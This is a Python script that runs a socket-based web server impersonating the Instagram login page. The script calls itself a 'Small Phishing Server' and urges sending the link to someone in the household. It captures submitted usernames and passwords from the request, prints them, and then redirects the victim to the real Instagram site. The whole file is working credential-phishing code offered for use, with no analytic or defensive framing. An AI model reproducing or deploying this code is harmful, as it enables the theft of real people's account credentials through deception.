import socket, threading
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip = socket.gethostbyname(socket.gethostname())
port = 80
s.bind((ip, port))
print(f'[+] Hostname: {socket.gethostname()}')
print(f"[+] Server hosted on {ip}:{port}")
print("[+] Small Phishing Server is Up.....")
print(f"\n[+] Send this to a person in your household: http://{ip}")
def listen():
    while True:
        try:
            s.listen(1)
            c, ip = s.accept()
            msg = c.recv(1024).decode()
            client = threading.Thread(target=handler,args=(c, msg, ip[0]))
            client.start()
        except:
            pass
def handler(c, msg, ip):
    try:
        already_requested = False
        c.send('HTTP/1.0 200 OK\n'.encode())
        c.send('Content-Type: text/html\n'.encode())
        c.send('\n'.encode())
        if 'username=' in msg:
            already_requested = True
            msg_split = msg.split()
            if 'username=' in msg_split[1]:
                info = msg_split[1]
                result = ""
                for i in info:
                    if i == "=" or i == "&":
                        result += " "
                    else:
                        result += i
                result = result.strip().split()
                username = result[1]
                password = result[3]
                print(f"\n[+] User Info Obtained from IP {ip}.\n[+] Username: {username}\n[+] Password: {password}")
            else:
                pass
        if already_requested:
            c.send("""
            <meta http-equiv="Refresh" content="0; url='https://instagram.com/'" />          
            """.encode())
        if not already_requested:
            c.send("""
                                        <style>
                                            * {
                                          margin: 0px;
                                          padding: 0px;
                                        }

                                        body {
                                          background-color: #eee;
                                        }

                                        #wrapper {
                                          width: 500px;
                                          height: 50%;
                                          overflow: hidden;
                                          border: 0px solid #000;
                                          margin: 50px auto;
                                          padding: 10px;
                                        }

                                        .main-content {
                                          width: 250px;
                                          height: 40%;
                                          margin: 10px auto;
                                          background-color: #fff;
                                          border: 2px solid #e6e6e6;
                                          padding: 40px 50px;
                                        }

                                        .header {
                                          border: 0px solid #000;
                                          margin-bottom: 5px;
                                        }

                                        .header img {
                                          height: 50px;
                                          width: 175px;
                                          margin: auto;
                                          position: relative;
                                          left: 40px;
                                        }

                                        .input-1,
                                        .input-2 {
                                          width: 100%;
                                          margin-bottom: 5px;
                                          padding: 8px 12px;
                                          border: 1px solid #dbdbdb;
                                          box-sizing: border-box;
                                          border-radius: 3px;
                                        }

                                        .overlap-text {
                                          position: relative;
                                        }

                                        .overlap-text a {
                                          position: absolute;
                                          top: 8px;
                                          right: 10px;
                                          color: #003569;
                                          font-size: 14px;
                                          text-decoration: none;
                                          font-family: 'Overpass Mono', monospace;
                                          letter-spacing: -1px;
                                        }

                                        .btn {
                                          width: 100%;
                                          background-color: #3897f0;
                                          border: 1px solid #3897f0;
                                          padding: 5px 12px;
                                          color: #fff;
                                          font-weight: bold;
                                          cursor: pointer;
                                          border-radius: 3px;
                                        }

                                        .sub-content {
                                          width: 250px;
                                          height: 40%;
                                          margin: 10px auto;
                                          border: 1px solid #e6e6e6;
                                          padding: 20px 50px;
                                          background-color: #fff;
                                        }

                                        .s-part {
                                          text-align: center;
                                          font-family: 'Overpass Mono', monospace;
                                          word-spacing: -3px;
                                          letter-spacing: -2px;
                                          font-weight: normal;
                                        }

                                        .s-part a {
                                          text-decoration: none;
                                          cursor: pointer;
                                          color: #3897f0;
                                          font-family: 'Overpass Mono', monospace;
                                          word-spacing: -3px;
                                          letter-spacing: -2px;
                                          font-weight: normal;
                                        }

                                        </style>
                                        <title>
                                            Instagram
                                        </title>
                                        <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/1200px-Instagram_logo_2016.svg.png">
                                        <div id="wrapper">
                                          <div class="main-content">
                                            <div class="header">
                                              <img src="https://i.imgur.com/zqpwkLQ.png" />
                                            </div>
                                            <div class="l-part">
                                              <form action="http://[2a02:908:4c10:42c0:87f:54a9:6121:f0f6]/">
                                                <input type="text" placeholder="Username" class="input-1" name="username">
                                                <div class="overlap-text">
                                                <input type="password" placeholder="Password" name="password" style="width: 100%; margin-bottom: 5px; padding: 8px 12px; border: 1px solid #dbdbdb; box-sizing: border-box; border-radius: 3px;">
                                                <a href="https://www.instagram.com/accounts/password/reset/">Forgot?</a>
                                                </div>
                                                <input type="submit" value="Log in" class="btn"/>
                                              </form>
                                            </div>
                                          </div>
                                          <div class="sub-content">
                                            <div class="s-part">
                                              Don't have an account?<a href="https://www.instagram.com/accounts/emailsignup/"> Sign up</a>
                                            </div>
                                          </div>
                                        </div>
                                                """.encode())
        c.close()
    except:
        pass
listen()
